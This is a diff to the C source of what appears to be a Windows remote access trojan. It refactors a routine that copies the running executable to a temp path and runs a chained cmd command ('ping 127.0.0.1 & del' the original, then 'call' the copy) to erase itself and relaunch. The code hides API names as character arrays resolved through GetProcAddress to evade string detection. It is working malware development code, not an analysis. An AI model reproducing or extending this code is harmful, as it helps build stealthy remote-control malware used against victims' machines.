@@ -318,6 +318,45 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	return 0;
 }
 
+void
+CopyAndRunFromTempFolder(char* currentPath, char* newPath)
+{
+	char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
+	_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
+
+	if ( f_CopyFileA == NULL )
+	{
+#if DEBUG
+		char buffer[256];
+		sprintf_s(buffer, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
+		OutputDebugStringA(buffer);
+#endif		
+	}
+	
+	if ( f_CopyFileA(currentPath, newPath, 0) == 0 )
+	{
+#if DEBUG
+		char buffer[256];
+		sprintf_s(buffer, "Failure in copying the file: %d\n", GetLastError());
+		OutputDebugStringA(buffer);
+#endif		
+	}
+
+	// Runs a cmd process: Waits for a while, deletes the current file, and then runs the newly copied file
+	//
+	char pingCommand[] = { 'p','i','n','g',' ','1','2','7','.','0','.','0','.','1',' ','&',' ','d','e','l',' ',0 };
+	size_t pingCommandLength = strlen(pingCommand);
+	char commandToRun[MAX_PATH * 2 + 30] = {};
+	strncpy_s(commandToRun, pingCommand, pingCommandLength);
+	strncat_s(commandToRun, currentPath, strlen(currentPath));
+
+	char callCommand[] = { ' ','&',' ','c','a','l','l',' ',0 };
+	strncat_s(commandToRun, callCommand, strlen(currentPath));
+	strncat_s(commandToRun, newPath, strlen(newPath));
+		
+	RunCommandInProcess(commandToRun, 0);
+}
+
 int CALLBACK
 WinMain(HINSTANCE hInstance,
 		HINSTANCE hPrevInstance,
@@ -351,40 +390,7 @@ WinMain(HINSTANCE hInstance,
 	if ( strcmp(currentPath, newPath) != 0 )
 #endif
 	{
-		char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
-		_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
-
-		if ( f_CopyFileA == NULL )
-		{
-#if DEBUG
-			char buffer[256];
-			sprintf_s(buffer, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
-			OutputDebugStringA(buffer);
-#endif		
-		}
-	
-		if ( f_CopyFileA(currentPath, newPath, 0) == 0 )
-		{
-#if DEBUG
-			char buffer[256];
-			sprintf_s(buffer, "Failure in copying the file: %d\n", GetLastError());
-			OutputDebugStringA(buffer);
-#endif		
-		}
-
-		// Runs a cmd process: Waits for a while, deletes the current file, and then runs the newly copied file
-		//
-		char pingCommand[] = { 'p','i','n','g',' ','1','2','7','.','0','.','0','.','1',' ','&',' ','d','e','l',' ',0 };
-		size_t pingCommandLength = strlen(pingCommand);
-		char commandToRun[MAX_PATH * 2 + 30] = {};
-		strncpy_s(commandToRun, pingCommand, pingCommandLength);
-		strncat_s(commandToRun, currentPath, strlen(currentPath));
-
-		char callCommand[] = { ' ','&',' ','c','a','l','l',' ',0 };
-		strncat_s(commandToRun, callCommand, strlen(currentPath));
-		strncat_s(commandToRun, newPath, strlen(newPath));
-		
-		RunCommandInProcess(commandToRun, 0);
+		CopyAndRunFromTempFolder(currentPath, newPath);
 		return 0;
 	}
 	
